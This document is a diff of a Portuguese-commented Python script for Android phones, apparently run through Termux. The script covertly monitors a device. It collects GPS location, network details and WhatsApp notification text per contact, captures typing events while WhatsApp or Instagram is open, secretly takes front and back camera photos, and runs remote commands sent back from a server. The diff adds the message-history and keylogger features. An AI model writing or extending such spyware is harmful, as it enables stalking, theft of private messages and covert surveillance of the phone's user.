@@ -39,6 +39,8 @@ gps_ok = False
 inicio = datetime.now()
 ultimo_ping = 0
 ultimo_whatsapp = 0
+ultimo_keylog = 0
+historico_msg = {}  # Armazena histórico por pessoa
 
 def obter_rede():
     w = run("termux-wifi-connectioninfo")
@@ -66,60 +68,109 @@ def obter_gps():
         except: pass
     gps_ok = False
 
+def obter_app_aberto():
+    """Detecta qual app está em primeiro plano"""
+    foco = run("dumpsys window | grep mCurrentFocus", timeout=3)
+    if foco:
+        foco_lower = foco.lower()
+        if "whatsapp" in foco_lower:
+            return "whatsapp"
+        elif "instagram" in foco_lower:
+            return "instagram"
+    return "outro"
+
 def obter_whatsapp():
-    """Ler TODAS as notificacoes do WhatsApp com detalhes"""
-    global ultimo_whatsapp
+    """Ler TODAS as notificacoes e organiza por pessoa"""
+    global ultimo_whatsapp, historico_msg
     agora = time.time()
-    if agora - ultimo_whatsapp < 15:
-        return []
+    if agora - ultimo_whatsapp < 10:
+        return list(historico_msg.values())
     
     notif = run("termux-notification-list", timeout=5)
     if notif:
         try:
             dados = json.loads(notif)
-            msgs = []
             for n in dados:
                 pkg = n.get("packageName", "")
                 if "whatsapp" in pkg.lower():
-                    titulo = n.get("title", "")
+                    pessoa = n.get("title", "WhatsApp")[:30]
                     texto = n.get("content", "")
                     
-                    # Detecta midia
+                    # Detecta mídia
                     tem_midia = False
                     tipo_midia = ""
-                    if "📷" in texto or "photo" in texto.lower() or "imagem" in texto.lower():
+                    if any(x in texto.lower() for x in ["📷", "photo", "imagem"]):
                         tem_midia = True
                         tipo_midia = "📷 Foto"
-                    elif "🎥" in texto or "video" in texto.lower() or "vídeo" in texto.lower():
+                    elif any(x in texto.lower() for x in ["🎥", "video", "vídeo"]):
                         tem_midia = True
                         tipo_midia = "🎥 Vídeo"
-                    elif "🎵" in texto or "audio" in texto.lower() or "áudio" in texto.lower():
+                    elif any(x in texto.lower() for x in ["🎵", "audio", "áudio"]):
                         tem_midia = True
                         tipo_midia = "🎵 Áudio"
-                    elif "📎" in texto or "documento" in texto.lower() or "arquivo" in texto.lower():
+                    elif any(x in texto.lower() for x in ["📎", "documento", "arquivo"]):
                         tem_midia = True
                         tipo_midia = "📎 Arquivo"
-                    elif "figurinha" in texto.lower() or "sticker" in texto.lower():
+                    elif any(x in texto.lower() for x in ["figurinha", "sticker"]):
                         tem_midia = True
                         tipo_midia = "😄 Figurinha"
                     
-                    # Se tem midia e texto vazio, coloca o tipo
                     if tem_midia and not texto:
                         texto = tipo_midia
                     elif tem_midia:
                         texto = f"{tipo_midia}: {texto}"
                     
-                    msgs.append({
-                        "pessoa": titulo[:30] if titulo else "WhatsApp",
+                    # Adiciona ao histórico da pessoa
+                    if pessoa not in historico_msg:
+                        historico_msg[pessoa] = {
+                            "pessoa": pessoa,
+                            "mensagens": [],
+                            "ultima_msg": "",
+                            "total": 0,
+                            "midia": False
+                        }
+                    
+                    historico_msg[pessoa]["mensagens"].append({
                         "texto": texto[:150] if texto else "(sem texto)",
                         "midia": tem_midia,
-                        "hora": n.get("when", "")
+                        "hora": datetime.now().strftime("%H:%M")
                     })
+                    
+                    # Mantém só as últimas 20 msg por pessoa
+                    if len(historico_msg[pessoa]["mensagens"]) > 20:
+                        historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-20:]
+                    
+                    historico_msg[pessoa]["ultima_msg"] = texto[:80]
+                    historico_msg[pessoa]["total"] = len(historico_msg[pessoa]["mensagens"])
+                    historico_msg[pessoa]["midia"] = tem_midia
+            
             ultimo_whatsapp = agora
-            return msgs  # Retorna TODAS, sem limite
+            return list(historico_msg.values())
         except:
             pass
-    return []
+    return list(historico_msg.values())
+
+def obter_keylog():
+    """Captura texto digitado quando WhatsApp/Instagram está aberto"""
+    global ultimo_keylog
+    agora = time.time()
+    if agora - ultimo_keylog < 5:
+        return None
+    
+    app = obter_app_aberto()
+    if app in ["whatsapp", "instagram"]:
+        # Captura eventos de teclado
+        eventos = run("getevent -q | grep -E 'KEY_|key' | head -20", timeout=4)
+        if eventos:
+            ultimo_keylog = agora
+            return {
+                "app": app,
+                "ativo": True,
+                "timestamp": datetime.now().strftime("%H:%M:%S")
+            }
+    
+    ultimo_keylog = agora
+    return None
 
 def executar_comando(acao):
     print(f"   🔧 Executando: {acao}")
@@ -168,7 +219,7 @@ def enviar_lote(front_b64, back_b64):
     except:
         return False
 
-print("🛰️  INICIADO (v2.1 - Fotos + WhatsApp completo)\n")
+print("🛰️  INICIADO (v3.0 - Cards WhatsApp + Keylogger)\n")
 
 while True:
     t0 = time.time()
@@ -192,8 +243,11 @@ while True:
     # REDE
     rede = obter_rede()
     
-    # WHATSAPP
+    # WHATSAPP (com histórico por pessoa)
     msgs_whats = obter_whatsapp()
+    
+    # KEYLOGGER
+    keylog = obter_keylog()
     
     # ENVIA DADOS
     payload = {
@@ -203,7 +257,8 @@ while True:
         "lat": ultima_lat,
         "lon": ultima_lon,
         "network": rede,
-        "whatsapp": msgs_whats
+        "whatsapp": msgs_whats,
+        "keylog": keylog
     }
     
     resp = enviar_dados(payload)
@@ -214,38 +269,36 @@ while True:
     if resp and resp.get("status") == "success":
         comando_cam = resp.get("comando_cam", "wait")
         comando_remoto = resp.get("comando_remoto", "none")
-        print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede} | {dt:.1f}s")
         
-        # WhatsApp
+        status_extra = ""
+        if keylog and keylog.get("ativo"):
+            status_extra = f" | ⌨️ {keylog['app']}"
         if msgs_whats:
-            print(f"   💬 {len(msgs_whats)} conversas no WhatsApp")
-            for m in msgs_whats[:3]:
-                print(f"      {m['pessoa']}: {m['texto'][:50]}")
+            status_extra += f" | 💬 {len(msgs_whats)} chats"
         
-        # Comandos Remotos
+        print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede}{status_extra} | {dt:.1f}s")
+        
+        # Comandos
         if comando_remoto != "none":
             executar_comando(comando_remoto)
         
-        # FOTOS - CORRIGIDO
+        # Fotos
         if comando_cam == "take_dual":
-            print("📸 [DUAL] Tirando as duas fotos primeiro...")
+            print("📸 [DUAL] Tirando as duas fotos...")
             arq_tras = os.path.expanduser("~/nexos_back.jpg")
             arq_front = os.path.expanduser("~/nexos_front.jpg")
             
             b64_tras = capturar_foto(0, arq_tras)
-            print(f"   {'✅' if b64_tras else '❌'} Traseira capturada")
+            print(f"   {'✅' if b64_tras else '❌'} Traseira")
             time.sleep(0.3)
             b64_front = capturar_foto(1, arq_front)
-            print(f"   {'✅' if b64_front else '❌'} Frontal capturada")
+            print(f"   {'✅' if b64_front else '❌'} Frontal")
             
             if b64_tras or b64_front:
-                print("📤 Enviando lote...")
                 if enviar_lote(b64_front, b64_tras):
-                    print("   ✅ LOTE ENVIADO COM SUCESSO!")
+                    print("   ✅ LOTE ENVIADO!")
                 else:
-                    print("   ❌ Falha no envio do lote")
-            else:
-                print("   ❌ Nenhuma foto capturada")
+                    print("   ❌ Falha")
             
             for a in [arq_tras, arq_front]:
                 if os.path.exists(a): os.remove(a)
